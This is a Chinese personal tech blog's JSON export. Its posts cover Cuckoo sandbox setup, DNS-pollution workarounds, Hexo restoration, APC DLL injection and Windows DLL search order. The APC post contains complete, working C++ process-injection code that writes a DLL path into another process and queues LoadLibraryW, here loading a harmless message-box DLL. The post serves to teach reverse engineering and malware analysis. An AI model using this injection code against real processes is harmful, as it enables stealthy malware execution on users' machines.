{"meta":{"title":"fengchuiguo","subtitle":"","description":"","author":"fengchuiguo","url":"http://zwjsfdbb.top","root":"/"},"pages":[{"title":"分类","date":"2023-07-05T13:31:53.000Z","updated":"2023-07-05T13:33:36.598Z","comments":true,"path":"categories/index.html","permalink":"http://zwjsfdbb.top/categories/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2023-07-05T13:32:24.000Z","updated":"2023-07-05T13:33:41.728Z","comments":true,"path":"link/index.html","permalink":"http://zwjsfdbb.top/link/index.html","excerpt":"","text":""},{"title":"标签","date":"2023-07-05T13:31:10.000Z","updated":"2023-07-05T13:33:28.461Z","comments":true,"path":"tags/index.html","permalink":"http://zwjsfdbb.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"cuckoo真机分析环境(clonezilla)","slug":"cuckoo真机分析环境","date":"2023-07-05T15:27:24.776Z","updated":"2017-04-02T16:22:44.372Z","comments":true,"path":"2023/07/05/cuckoo真机分析环境/","link":"","permalink":"http://zwjsfdbb.top/2023/07/05/cuckoo%E7%9C%9F%E6%9C%BA%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83/","excerpt":"序言介绍：为了应对层出不穷的反虚拟机技术，本文实现一种真机搭建cuckoo的方式，结合国家网路中心的clonezila来实现分析机器的还原。 1.硬件准备*ubuntu16.04服务器一台(可在虚拟机中实现） *win7或者winxp一台 *交换机一台 2.服务器搭建&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;我选择的目前最新的ubuntu16.04，内置python2.7比较方便,当然也可以选择其他版本的系统，或者centos应该也可以，不过最好用ubuntu,因为资料较多，cuckoo官方资料也是用cuckoo搭建的。 1.安装python2.7 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;这是cuckoo所需要的，如果你的系统内置了python2.7那就不用安装了，安装步骤网上教程一大堆，不再赘述。查看python版本 python -V，一般内置pip安装工具，没有的话另外安装一下。 2.安装依赖库 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;1.安装相关的依赖库 sudo apt-get install python python-pip python-dev libffi-dev libssl-dev libxml2-dev libxslt1-dev libjpeg-dev","text":"序言介绍：为了应对层出不穷的反虚拟机技术，本文实现一种真机搭建cuckoo的方式，结合国家网路中心的clonezila来实现分析机器的还原。 1.硬件准备*ubuntu16.04服务器一台(可在虚拟机中实现） *win7或者winxp一台 *交换机一台 2.服务器搭建&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;我选择的目前最新的ubuntu16.04，内置python2.7比较方便,当然也可以选择其他版本的系统，或者centos应该也可以，不过最好用ubuntu,因为资料较多，cuckoo官方资料也是用cuckoo搭建的。 1.安装python2.7 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;这是cuckoo所需要的，如果你的系统内置了python2.7那就不用安装了，安装步骤网上教程一大堆，不再赘述。查看python版本 python -V，一般内置pip安装工具，没有的话另外安装一下。 2.安装依赖库 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;1.安装相关的依赖库 sudo apt-get install python python-pip python-dev libffi-dev libssl-dev libxml2-dev libxslt1-dev libjpeg-dev 然后去cuckoog官网或者github下载cuckoo最新版本,然后解压打开cuckoo文件夹，有个requiremens.txt的文件夹，这需要全部下载，可以用python的pip进行安装，其中其中的 pefile 需要从 Google Code 上下载，由于大陆网络限制，需要自备梯子，登上梯子后执行以下批量安装命令： pip install -r requirements.txt 或者先把pefile安装源码下载，手动安装，然后把它从requirements.txt里删除，然后用pip命令安装，个人建议用第二种方法。 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;2.Host 机需要可以嗅探网络数据包，需要安装 tcpdump ，如果本机没有，则执行以下命令安装 tcpdump： **apt-get install tcpdump** 如果系统没启用 root 账户，由于 tcpdump 的执行需要 root 权限，则需要以下配置： **$ sudo setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump** 如果系统里没有setcap命令，则需要安装 libpcap包： **$ sudo apt-get install libcap2-bin** 如果需要启用内存镜像分析，需要安装 volatility： **apt-get install volatility** 3.cuckoo配置文件的修改 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;主要修改的文件有：cuckoo.conf,physical.conf,auliary.conf.重点修改前两个。 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;1.修改cuckoo.conf version_check = on 这个其实可以关掉，不然一直检查，如果你版本稍微低了一下就报错。 machinery = physical 这个地方改成physical ip = 192.168.56.1 根据你的实际情况填写 vm_state = 60 根据你的电脑实际还原时间填写 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;2.修改physical.conf user &#x3D; username password &#x3D; password 根据你的分析机填写 interface &#x3D; eth0根据你的网卡填写 ip &#x3D; 192.168.56.101根据你的分析机填写 4.安装drbl &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;1. 设置静态ip地址，直接在桌面设置及可以了。 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;2.安装drbl金钥 wget -q http://drbl.nchc.org.tw/GPG-KEY-DRBL -O- | sudo apt-key add - &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;3.添加drbl源(根据自己的系统版本修改一下） vi /etc/apt/sources.list deb http://free.nchc.org.tw/ubuntu xenial main restricted universe multiverse deb http://free.nchc.org.tw/drbl-core drbl stable &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;3.安装drbl sudo apt-get update sudo apt-get install drbl &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;4.设置drblserver sudo drblsrv -i 提示!当有yes&#x2F;no选项的时候，预设的值是大写的字母。例如 (y&#x2F;N), 预设值是 “N”, 当你按 “Enter”的时候，程式使用的值就是 “N”。如果你不确认选用那个好的时候，直接按”Enter”键是一个保险的方式.感觉不保险的话，去搜一下，很多介绍的，在这不赘述。 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;5.设置环境 sudo drblpush -i 提示!当有yes&#x2F;no选项的时候，预设的值是大写的字母。例如 (y&#x2F;N), 预设值是 “N”, 当你按 “Enter”的时候，程式使用的值就是 “N”。如果你不确认选用那个好的时候，直接按”Enter”键是一个保险的方式.感觉不保险的话，去搜一下，很多介绍的，一般都差不多。注意有一点，搜集网卡的时候尽量选择实时收集，然后收集完，注意查看是否有文件在相应目录，还有注意系统读取网卡文件的名字的命名方式，比如我的网卡为ens33,所以网卡文件为macadr-ens33.txt,但是系统读取文件的时候可能会去查找以macadr-eth开头的文件，所以遇到这种情况的话，去手动创建一个这样的文件就可以了。还有就是配置的时候尽量切到&#x2F;etc&#x2F;drbl目录下进行操作。 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;6.现在基本上drbl就设置好了。 5。网路设置 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;由于我在虚拟机上搭建的服务器，所以我选择桥接模式，桥接到物理机有线网卡上，然后外接到交换机，然后分析机器也接到交换机，构成一个物理的局域网环境。 3.分析机设置1.首先安装python2.7，去python官网下载就好了。 2.关闭防火墙，自动更新，uac。 3.设置python运行权限为管理员。 4.设置固定ip.(注意此时的ip不要和clonezila给他分配的ip一致，否则在还原的时候，网络捕捉模块会抓取太多还原时候的无用包，从而导致分析报告异常庞大。） **到此整个环境搭建就已经差不多了。注意需要熟悉drbl的使用方法才能使用此环境。此外还需要把drbl还原分析机的指令加入到cuckoo的源代码里去。文件具体为：scheduler库文件，添加到让分析机关机指令的前面位置。","categories":[{"name":"恶意代码","slug":"恶意代码","permalink":"http://zwjsfdbb.top/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"http://zwjsfdbb.top/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"}]},{"title":"dns污染的解决","slug":"dns污染的解决","date":"2017-11-14T16:00:00.000Z","updated":"2023-07-04T14:15:12.119Z","comments":true,"path":"2017/11/15/dns污染的解决/","link":"","permalink":"http://zwjsfdbb.top/2017/11/15/dns%E6%B1%A1%E6%9F%93%E7%9A%84%E8%A7%A3%E5%86%B3/","excerpt":"dnsmasq+chinadns+hev-dns-forwarder 1.安装dnsmasq sudo apt-get install dnsmasq 编辑/etc/dnsmasq.conf 取消no-resolv前面的注释 server=127.0.0.1#5354 2.安装chindns https://github.com/shadowsocks/ChinaDNS/releases/download/1.3.2/chinadns-1.3.2.tar.gz 解压 tar -zxf chinadns-1.3.2.tar.gz cd chinadns-1.3.2 .&#x2F;configure make make install 安装结束后在复制到&#x2F;usr&#x2F;local&#x2F;bin 目录中去（可能已经自动复制到了，确认一下） 运行命令为 chinadns -c &#x2F;home&#x2F;pi&#x2F;Desktop&#x2F;chinadns-1.3.2&#x2F;chnroute.txt -s 114.114.114.114,127.0.0.1:5300 -p 5354 -m &amp; &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 3.安装 git clone https://github.com/aa65535/hev-dns-forwarder cd hev-dns-forwarder make 编译完会在src目录下生成二进制文件，复制到/usr/local/bin目录下 运行命令 hev-dns-forwarder 4.加入开机启动项 在/etc/rc.local中加入 sudo hev-dns-forwarder &amp; &gt; /dev/null 2&gt;&amp;1 sudo chinadns -c /home/pi/Desktop/chinadns-1.3.2/chnroute.txt -s 114.114.114.114,127.0.0.1:5300 -p 5354 -m &amp; &gt; /dev/null 2&gt;&amp;1 参考链接：https://blog.bluerain.io/p/SS-Redir-For-Router.html ​","text":"dnsmasq+chinadns+hev-dns-forwarder 1.安装dnsmasq sudo apt-get install dnsmasq 编辑/etc/dnsmasq.conf 取消no-resolv前面的注释 server=127.0.0.1#5354 2.安装chindns https://github.com/shadowsocks/ChinaDNS/releases/download/1.3.2/chinadns-1.3.2.tar.gz 解压 tar -zxf chinadns-1.3.2.tar.gz cd chinadns-1.3.2 .&#x2F;configure make make install 安装结束后在复制到&#x2F;usr&#x2F;local&#x2F;bin 目录中去（可能已经自动复制到了，确认一下） 运行命令为 chinadns -c &#x2F;home&#x2F;pi&#x2F;Desktop&#x2F;chinadns-1.3.2&#x2F;chnroute.txt -s 114.114.114.114,127.0.0.1:5300 -p 5354 -m &amp; &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 3.安装 git clone https://github.com/aa65535/hev-dns-forwarder cd hev-dns-forwarder make 编译完会在src目录下生成二进制文件，复制到/usr/local/bin目录下 运行命令 hev-dns-forwarder 4.加入开机启动项 在/etc/rc.local中加入 sudo hev-dns-forwarder &amp; &gt; /dev/null 2&gt;&amp;1 sudo chinadns -c /home/pi/Desktop/chinadns-1.3.2/chnroute.txt -s 114.114.114.114,127.0.0.1:5300 -p 5354 -m &amp; &gt; /dev/null 2&gt;&amp;1 参考链接：https://blog.bluerain.io/p/SS-Redir-For-Router.html ​","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"重装系统后hexo 博客恢复","slug":"hexo 博客恢复","date":"2017-11-04T16:00:00.000Z","updated":"2023-07-04T14:16:01.732Z","comments":true,"path":"2017/11/05/hexo 博客恢复/","link":"","permalink":"http://zwjsfdbb.top/2017/11/05/hexo%20%E5%8D%9A%E5%AE%A2%E6%81%A2%E5%A4%8D/","excerpt":"1.安装node.js和git 这个不用多说，直接下载安装就行了。 2.配置 git 个人信息，生成新的 ssh 密钥：git config –global user.name “xxxxxx”git config –global user.email “xxxxxx”ssh-keygen -t rsa -C “xxxxxxxx(邮箱)” 3.添加公钥在用户文件夹.ssh 文件里面把公钥复制出来粘贴到github个人设置的ssh位置。 4.安装hexo建议先npm install cnpm -g –registry&#x3D;https://registry.npm.taobao.org安装的时候 用cpm 代替npm这样的话npm 安装比较快而且不容易失败cnpm install hexo-cli -g 5.删除博客文件夹文件，保留部分打开原来的博客文件夹,只需保留_config.yml，theme&#x2F;，source&#x2F;，scaffolds&#x2F;，package.json，.gitignore 这些项目，删除其他的文件。","text":"1.安装node.js和git 这个不用多说，直接下载安装就行了。 2.配置 git 个人信息，生成新的 ssh 密钥：git config –global user.name “xxxxxx”git config –global user.email “xxxxxx”ssh-keygen -t rsa -C “xxxxxxxx(邮箱)” 3.添加公钥在用户文件夹.ssh 文件里面把公钥复制出来粘贴到github个人设置的ssh位置。 4.安装hexo建议先npm install cnpm -g –registry&#x3D;https://registry.npm.taobao.org安装的时候 用cpm 代替npm这样的话npm 安装比较快而且不容易失败cnpm install hexo-cli -g 5.删除博客文件夹文件，保留部分打开原来的博客文件夹,只需保留_config.yml，theme&#x2F;，source&#x2F;，scaffolds&#x2F;，package.json，.gitignore 这些项目，删除其他的文件。 6.git bush在本文件夹下git bush,运行cnpm install 7.安装部署插件npm install hexo-deployer-git –save 8.测试此时就可以hexo g &amp;&amp; hexo d 测试是否成功了。","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]},{"title":"dll注入之APC注入","slug":"dll之APC注入","date":"2017-09-15T16:00:00.000Z","updated":"2017-10-25T07:05:57.305Z","comments":true,"path":"2017/09/16/dll之APC注入/","link":"","permalink":"http://zwjsfdbb.top/2017/09/16/dll%E4%B9%8BAPC%E6%B3%A8%E5%85%A5/","excerpt":"APC注入的原理是利用当线程被唤醒时APC中的注册函数会被执行的机制，并以此去执行我们的DLL加载代码，进而完成DLL注入的目的，其具体流程如下： 1）当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()时，系统就会产生一个软中断（或者是Messagebox弹窗的时候不点OK的时候也能注入）。 2）当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。 3）利用QueueUserAPC()这个API可以在软中断时向线程的APC队列插入一个函数指针，如果我们插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。程序如下: // TESTAPC2.cpp : 定义控制台应用程序的入口点。 // #include &quot;stdafx.h&quot; #include &lt;string&gt; #include&lt;windows.h&gt; #include&lt;shlwapi.h&gt; #include&lt;tlhelp32.h&gt; #include&lt;winternl.h&gt; #pragma comment(lib,&quot;shlwapi.lib&quot;) #pragma comment(lib,&quot;ntdll.lib&quot;) using namespace std; //根据进程名获取PID DWORD GetPidFormName(wstring wsProcessname) &#123; HANDLE hSnaoshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnaoshot == INVALID_HANDLE_VALUE) &#123; return false; &#125; PROCESSENTRY32W pe = &#123; sizeof(pe) &#125;; BOOL bok; for (bok = Process32FirstW(hSnaoshot, &amp;pe); bok; bok = Process32NextW(hSnaoshot,&amp;pe)) &#123; wstring wsNowProcName = pe.szExeFile; if (StrStrI(wsNowProcName.c_str(), wsProcessname.c_str()) != NULL) &#123; CloseHandle(hSnaoshot); return pe.th32ProcessID; &#125; &#125; CloseHandle(hSnaoshot); return 0; &#125; //dll 文件注入到进程wsProcessname BOOL Injection_APC(const wstring &amp;wsProcessname, const WCHAR wcCacheInDllPath[]) &#123; DWORD dwProcessId = GetPidFormName(wsProcessname); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (!hProcess) &#123; return FALSE; &#125; PVOID lpData = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE); DWORD dwRet; if (lpData) &#123; //在远程进程申请空间写入待注入dll 的路径 WriteProcessMemory(hProcess, lpData, (LPVOID)wcCacheInDllPath,MAX_PATH, &amp;dwRet); CloseHandle(hProcess); &#125; //开始注入 THREADENTRY32 te = &#123; sizeof(te) &#125;; HANDLE handleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);//遍历系统中所有线程 if (handleSnap == INVALID_HANDLE_VALUE) &#123; return false; &#125; bool bstat = false; if (Thread32First(handleSnap, &amp;te)) &#123; do &#123; if (te.th32OwnerProcessID == dwProcessId) &#123; HANDLE handleThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID); if (handleThread) &#123; DWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryW, handleThread, (ULONG_PTR)lpData); &#125; if (dwRet &gt; 0) &#123; bstat = TRUE; &#125; CloseHandle(handleThread); &#125; &#125; while (Thread32Next(handleSnap, &amp;te)); CloseHandle(handleSnap); return bstat; &#125; &#125; int main() &#123; Injection_APC(L&quot;testapc.exe&quot;, L&quot;testapcdll.dll&quot;); return 0; &#125; 测试exe程序： #include&lt;windows.h&gt; int main() &#123; MessageBox(NULL, L&quot;start&quot;, L&quot;tit&quot;, MB_OK); SleepEx(1000 * 60 * 5, true); MessageBox(NULL, L&quot;end&quot;, L&quot;tit&quot;, MB_OK); Sleep(-1); &#125; 测试dll 程序： #include&lt;windows.h&gt; #include&quot;dll.h&quot; BOOL APIENTRY DllMain(HANDLE hModule, DWORD dwReason, void* lpReserved) &#123; switch (dwReason) &#123; // 动态链接库映射到某个进程的地址空间 case DLL_PROCESS_ATTACH: MessageBox(NULL, L&quot;in apc ok~&quot;, L&quot;tit&quot;, MB_OK); /** * 当DLL刚被加载时触发（LoadLibrary），此处专门用来做初始化工作， * 如果初始化失败可以返回 false 这样DLL就不会被继续加载了 **/ break; // 应用程序创建新的线程 case DLL_THREAD_ATTACH: break; // 应用程序某个线程正常终止 case DLL_THREAD_DETACH: break; // 动态链接库将被卸载 case DLL_PROCESS_DETACH: /** * 当DLL将要被卸载时触发（FreeLibrary）,此处专门用来做清理工作 * 如关闭文件，释放内存空间等 **/ break; &#125; return 1; &#125; /* void helloDLL(void) &#123; //MessageBox(NULL, TEXT(&quot;Hello DLL~&quot;), TEXT(&quot;Title&quot;), MB_OK); &#125;*/","text":"APC注入的原理是利用当线程被唤醒时APC中的注册函数会被执行的机制，并以此去执行我们的DLL加载代码，进而完成DLL注入的目的，其具体流程如下： 1）当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()时，系统就会产生一个软中断（或者是Messagebox弹窗的时候不点OK的时候也能注入）。 2）当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。 3）利用QueueUserAPC()这个API可以在软中断时向线程的APC队列插入一个函数指针，如果我们插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。程序如下: // TESTAPC2.cpp : 定义控制台应用程序的入口点。 // #include &quot;stdafx.h&quot; #include &lt;string&gt; #include&lt;windows.h&gt; #include&lt;shlwapi.h&gt; #include&lt;tlhelp32.h&gt; #include&lt;winternl.h&gt; #pragma comment(lib,&quot;shlwapi.lib&quot;) #pragma comment(lib,&quot;ntdll.lib&quot;) using namespace std; //根据进程名获取PID DWORD GetPidFormName(wstring wsProcessname) &#123; HANDLE hSnaoshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnaoshot == INVALID_HANDLE_VALUE) &#123; return false; &#125; PROCESSENTRY32W pe = &#123; sizeof(pe) &#125;; BOOL bok; for (bok = Process32FirstW(hSnaoshot, &amp;pe); bok; bok = Process32NextW(hSnaoshot,&amp;pe)) &#123; wstring wsNowProcName = pe.szExeFile; if (StrStrI(wsNowProcName.c_str(), wsProcessname.c_str()) != NULL) &#123; CloseHandle(hSnaoshot); return pe.th32ProcessID; &#125; &#125; CloseHandle(hSnaoshot); return 0; &#125; //dll 文件注入到进程wsProcessname BOOL Injection_APC(const wstring &amp;wsProcessname, const WCHAR wcCacheInDllPath[]) &#123; DWORD dwProcessId = GetPidFormName(wsProcessname); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (!hProcess) &#123; return FALSE; &#125; PVOID lpData = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE); DWORD dwRet; if (lpData) &#123; //在远程进程申请空间写入待注入dll 的路径 WriteProcessMemory(hProcess, lpData, (LPVOID)wcCacheInDllPath,MAX_PATH, &amp;dwRet); CloseHandle(hProcess); &#125; //开始注入 THREADENTRY32 te = &#123; sizeof(te) &#125;; HANDLE handleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);//遍历系统中所有线程 if (handleSnap == INVALID_HANDLE_VALUE) &#123; return false; &#125; bool bstat = false; if (Thread32First(handleSnap, &amp;te)) &#123; do &#123; if (te.th32OwnerProcessID == dwProcessId) &#123; HANDLE handleThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID); if (handleThread) &#123; DWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryW, handleThread, (ULONG_PTR)lpData); &#125; if (dwRet &gt; 0) &#123; bstat = TRUE; &#125; CloseHandle(handleThread); &#125; &#125; while (Thread32Next(handleSnap, &amp;te)); CloseHandle(handleSnap); return bstat; &#125; &#125; int main() &#123; Injection_APC(L&quot;testapc.exe&quot;, L&quot;testapcdll.dll&quot;); return 0; &#125; 测试exe程序： #include&lt;windows.h&gt; int main() &#123; MessageBox(NULL, L&quot;start&quot;, L&quot;tit&quot;, MB_OK); SleepEx(1000 * 60 * 5, true); MessageBox(NULL, L&quot;end&quot;, L&quot;tit&quot;, MB_OK); Sleep(-1); &#125; 测试dll 程序： #include&lt;windows.h&gt; #include&quot;dll.h&quot; BOOL APIENTRY DllMain(HANDLE hModule, DWORD dwReason, void* lpReserved) &#123; switch (dwReason) &#123; // 动态链接库映射到某个进程的地址空间 case DLL_PROCESS_ATTACH: MessageBox(NULL, L&quot;in apc ok~&quot;, L&quot;tit&quot;, MB_OK); /** * 当DLL刚被加载时触发（LoadLibrary），此处专门用来做初始化工作， * 如果初始化失败可以返回 false 这样DLL就不会被继续加载了 **/ break; // 应用程序创建新的线程 case DLL_THREAD_ATTACH: break; // 应用程序某个线程正常终止 case DLL_THREAD_DETACH: break; // 动态链接库将被卸载 case DLL_PROCESS_DETACH: /** * 当DLL将要被卸载时触发（FreeLibrary）,此处专门用来做清理工作 * 如关闭文件，释放内存空间等 **/ break; &#125; return 1; &#125; /* void helloDLL(void) &#123; //MessageBox(NULL, TEXT(&quot;Hello DLL~&quot;), TEXT(&quot;Title&quot;), MB_OK); &#125;*/","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"dll加载和劫持","slug":"dll加载和劫持","date":"2017-08-02T16:00:00.000Z","updated":"2017-10-25T06:47:34.290Z","comments":true,"path":"2017/08/03/dll加载和劫持/","link":"","permalink":"http://zwjsfdbb.top/2017/08/03/dll%E5%8A%A0%E8%BD%BD%E5%92%8C%E5%8A%AB%E6%8C%81/","excerpt":"一.dll加载顺序 DLL查找路径基础 &amp;emsp;&amp;emsp;应用程序可以通过以下方式控制一个DLL的加载路径：使用全路径加载、使用DLL重定向、使用manifest文件。如果上述三种方式均未指定，系统查找DLL的顺序将按照本部分描述的顺序进行。 &amp;emsp;&amp;emsp;对于以下两种情况的DLL，系统将不会查找，而是直接加载： &amp;emsp;&amp;emsp;a. 对于已经加载到内存中的同名DLL，系统使用已经加载的DLL，并且忽略待加载DLL的路径。（注意对某个进程而言，系统已经加载的DLL一定是唯一的存在于某个目录下。） &amp;emsp;&amp;emsp;b. 如果该DLL存在于某个Windows版本的已知DLL列表（unkown DLL）中，系统使用已知DLL的拷贝（包括已知DLL的依赖项）。已知DLL列表可以从如下注册表项看到：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs。 &amp;emsp;&amp;emsp;这里有个比较坑的地方，对于有依赖项的DLL（即使使用全路径指定DLL位置），系统查找其所依赖DLL的方法是按照实际的模块名称来的，因此如果加载的DLL不在系统查找顺序目录下，那么动态加载该DLL（LoadLibrary）会返回一个”找不到模块”的错误。 2.系统标准DLL查找顺序 &amp;emsp;&amp;emsp;系统使用的标准DLL查找顺序依赖于是否设置了”安全DLL查找模式”（safe DLL search mode）。”安全DLL查找模式”会将用户当前目录置于查找顺序的后边。“安全DLL查找模式”默认是启用的，禁用的话，可以将注册表项HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode设为0。调用SetDllDirectory函数可以禁用”安全DLL查找模式”，并修改DLL查找顺序。Windows XP下，”安全DLL查找模式”默认是禁用的，需要启用该项的话，在注册表中新建一个SafeDllSearchMode子项，并赋值为1即可。”安全DLL查找模式”从Windows XP SP2开始，默认是启用的。 &amp;emsp;&amp;emsp;启用”安全DLL查找模式”时，查找顺序如下：","text":"一.dll加载顺序 DLL查找路径基础 &amp;emsp;&amp;emsp;应用程序可以通过以下方式控制一个DLL的加载路径：使用全路径加载、使用DLL重定向、使用manifest文件。如果上述三种方式均未指定，系统查找DLL的顺序将按照本部分描述的顺序进行。 &amp;emsp;&amp;emsp;对于以下两种情况的DLL，系统将不会查找，而是直接加载： &amp;emsp;&amp;emsp;a. 对于已经加载到内存中的同名DLL，系统使用已经加载的DLL，并且忽略待加载DLL的路径。（注意对某个进程而言，系统已经加载的DLL一定是唯一的存在于某个目录下。） &amp;emsp;&amp;emsp;b. 如果该DLL存在于某个Windows版本的已知DLL列表（unkown DLL）中，系统使用已知DLL的拷贝（包括已知DLL的依赖项）。已知DLL列表可以从如下注册表项看到：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs。 &amp;emsp;&amp;emsp;这里有个比较坑的地方，对于有依赖项的DLL（即使使用全路径指定DLL位置），系统查找其所依赖DLL的方法是按照实际的模块名称来的，因此如果加载的DLL不在系统查找顺序目录下，那么动态加载该DLL（LoadLibrary）会返回一个”找不到模块”的错误。 2.系统标准DLL查找顺序 &amp;emsp;&amp;emsp;系统使用的标准DLL查找顺序依赖于是否设置了”安全DLL查找模式”（safe DLL search mode）。”安全DLL查找模式”会将用户当前目录置于查找顺序的后边。“安全DLL查找模式”默认是启用的，禁用的话，可以将注册表项HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode设为0。调用SetDllDirectory函数可以禁用”安全DLL查找模式”，并修改DLL查找顺序。Windows XP下，”安全DLL查找模式”默认是禁用的，需要启用该项的话，在注册表中新建一个SafeDllSearchMode子项，并赋值为1即可。”安全DLL查找模式”从Windows XP SP2开始，默认是启用的。 &amp;emsp;&amp;emsp;启用”安全DLL查找模式”时，查找顺序如下： a . 应用程序所在目录； b. 系统目录。GetSystemDirectory返回的目录，通常是系统盘\\Windows\\System32；c. 16位系统目录。该项只是为了向前兼容的处理，可以不考虑；d. Windows目录。GetWindowsDirectory返回的目录，通常是系统盘\\Windows；e. 当前目录。GetCurrentDirectory返回的目录；f. 环境变量PATH中所有目录。 如果”安全DLL查找模式”被禁用，查找顺序如下：a. 应用程序所在目录；b. 当前目录。GetCurrentDirectory返回的目录；c. 系统目录。GetSystemDirectory返回的目录，通常是系统盘\\Windows\\System32；d. 16位系统目录。该项只是为了向前兼容的处理，可以不考虑；e. Windows目录。GetWindowsDirectory返回的目录，通常是系统盘\\Windows；f. 环境变量PATH中所有目录。 3. 修改系统DLL查找顺序系统使用的标准DLL查找顺序可以通过以下两种方式调整：3.1 使用LOAD_WITH_ALTERED_SEARCH_PATH标志调用LoadLibraryEx函数；这种方式调用LoadLibraryEx函数，需要设置lpFileName参数（绝对路径）。与标准查找策略不同的是，使用LOAD_WITH_ALTERED_SEARCH_PATH标志调用LoadLibraryEx函数的DLL查找顺序将”查找应用程序所在目录”修改为lpFileName指定的目录。3.2 调用SetDllDirectory函数。注意：SetDllDirectory函数在Windows XP SP1开始支持的。函数SetDllDirectory在调用参数lpPathName是一个路径时，可支持修改DLL搜索路径。修改之后的搜索顺序如下：a. 应用程序所在目录；b. 函数SetDllDirectory参数lpPathName给定的目录；c. 系统目录。GetSystemDirectory返回的目录，通常是系统盘\\Windows\\System32；d. 16位系统目录。该项只是为了向前兼容的处理，可以不考虑；e. Windows目录。GetWindowsDirectory返回的目录，通常是系统盘\\Windows；f. 环境变量PATH中所有目录。如果lpPathName参数为空字符串，这样就会把当前目录从DLL搜索路径中去掉。如果用NULL参数调用SetDllDirectory函数，可以恢复按照系统注册表的”安全DLL查找模式”来查找DLL。 当然win8或者windows server 2012提供更多的可定制方法，这个可以参考MSDN上介绍。比如：SetDefaultDllDirectories、 AddDllDirectory、RemoveDllDirectory。 4.为了测试计算机系统的dll 加载顺序可以通过一个程序加载一个不存在的dll,然后用process monitor 来监控加载的行为。 #include &lt;windows.h&gt; #include &lt;iostream&gt; int main(int argc, char ** argv) &#123; using std::cout; using std::endl; // 随便设置一个不存在的dll名 HMODULE hMod = LoadLibrary(&quot;123.dll&quot;); if (NULL != hMod) FreeLibrary(hMod); cout &lt;&lt; &quot;LoadLibrary Test&quot; &lt;&lt; endl; return 0; &#125; 5.通过process monitor 实际测试win10 64位发现加载顺序是 • 应用程序所在目录 • 系统目录（首先是c:\\Windows\\SysWOW64；然后是c:\\Windows\\System） • windows目录 • 当前目录 • 环境变量path目录 二 dll 劫持 